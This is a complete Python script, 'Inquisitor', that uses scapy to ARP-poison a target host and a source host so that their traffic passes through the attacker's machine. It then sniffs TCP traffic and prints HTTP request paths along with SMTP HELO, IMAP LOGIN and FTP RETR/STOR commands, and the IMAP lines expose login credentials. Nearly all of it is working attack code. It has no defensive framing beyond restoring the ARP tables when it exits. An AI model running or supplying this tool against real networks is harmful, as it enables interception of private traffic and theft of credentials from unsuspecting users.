#!/usr/local/bin/python3

import argparse
import re
from colorama import Fore, Style
import signal
import scapy.all as scapy

def arp_poisoning(ip_target, mac_target, ip_src):
	# In ARP protocol, there are two primary operations:
	# Request (op=1 or who-has): A host sends a request to find the MAC address corresponding to a specific IP address.
	# Response (op=2 or is-at): A host responds with its MAC address for the requested IP address.
	# When you construct an ARP packet, the key fields are pdst, hwdst, psrc, and op. 
	# By setting psrc to the target IP address you want to poison, you're saying, 
	# "I have this IP address."

	packet = scapy.ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, op='is-at')
	
	# Sends with no logs for 5 times to increase the chance of receiving
	
	scapy.send(packet, verbose=0, count=5)
	print(f"ARP Table poisoned at {ip_target}")

def arp_restore(ip_target, mac_target, ip_src, mac_src):
	packet = scapy.ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=mac_src, op='is-at')
	scapy.send(packet, verbose=0, count=7)
	print(f"ARP Table restored at {ip_target}")

class Inquisitor:
	def __init__(self, args):
		self.ip_src = args.ip_src
		self.mac_src = args.mac_src
		self.ip_target = args.ip_target
		self.mac_target = args.mac_target
	
	def packet_callback(self, packet):
		#packet.show()
		#print(packet.summary())
		if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
			payload = packet[scapy.Raw].load
			if b"GET" in payload:
				print(f"HTTP GET Request: {payload.decode().split(' ')[1]}")
			elif b"POST" in payload:
				print(f"HTTP POST Request: {payload.decode().split(' ')[1]}")
			elif b"A?" in payload:
				print("DNS A Record Query")
			elif b"HELO" in payload:
				print(f"SMTP HELO Command: {payload.decode()}")
			elif b"LOGIN" in payload:
				print(f"IMAP LOGIN Command: {payload.decode()}")
			elif b"RETR" in payload:
				print(f"FTP RETR Command: {payload.decode()[5:-2]}")
			elif b"STOR" in payload:
				print(f"FTP STOR Command: {payload.decode()[5:-2]}")

	def exit_signal(self, signum, frame):
		arp_restore(self.ip_target, self.mac_target, self.ip_src, self.mac_src)
		arp_restore(self.ip_src, self.mac_src, self.ip_target, self.mac_target)
		exit(1)
	
	def poison(self):
		try:
			signal.signal(signal.SIGINT, self.exit_signal)
			arp_poisoning(self.ip_target, self.mac_target, self.ip_src)
			arp_poisoning(self.ip_src, self.mac_src, self.ip_target)
			scapy.sniff(iface="eth0", prn=self.packet_callback, filter="tcp", store=False)
		except Exception as e:
			error_exit(e)

	
def error_exit(msg):
	print(f"{Fore.RED}Error: {msg}{Style.RESET_ALL}")
	exit(1)

def parse_args() -> argparse.Namespace:
	parser = argparse.ArgumentParser()
	parser.add_argument("ip_src", type=str, help="Source IP")
	parser.add_argument("mac_src", type=str, help="Source Mac")
	parser.add_argument("ip_target", type=str, help="Target IP")
	parser.add_argument("mac_target", type=str, help="Target Mac")
	args = parser.parse_args()
	return args

def is_valid_ip(ip:str) -> bool:
	try:
		num = ip.split('.')
		if len(num) != 4:
			return False
		for n in num:
			if int(n) < 0 or int(n) > 255:
				return False
		return True
	except Exception as e:
		return False
	
def is_valid_mac(mac:str) -> bool:
	mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]){2}$')
	return bool(mac_pattern.match(mac))

def validate_args(args:argparse.Namespace):
	try:
		if not is_valid_ip(args.ip_src):
			error_exit("Invalid source Ip address")
		if not is_valid_mac(args.mac_src):
			error_exit("Invalid Source Mac address")
		if not is_valid_ip(args.ip_target):
			error_exit("Invalid target Ip address")
		if not is_valid_mac(args.mac_target):
			error_exit("Invalid target Mac address")
	except Exception as e:
		error_exit(e)

def main():
	try:
		args = parse_args()
		validate_args(args)
		inquisitor = Inquisitor(args)
		inquisitor.poison()
	except Exception as e:
		error_exit(e)

if __name__ == "__main__":
	main()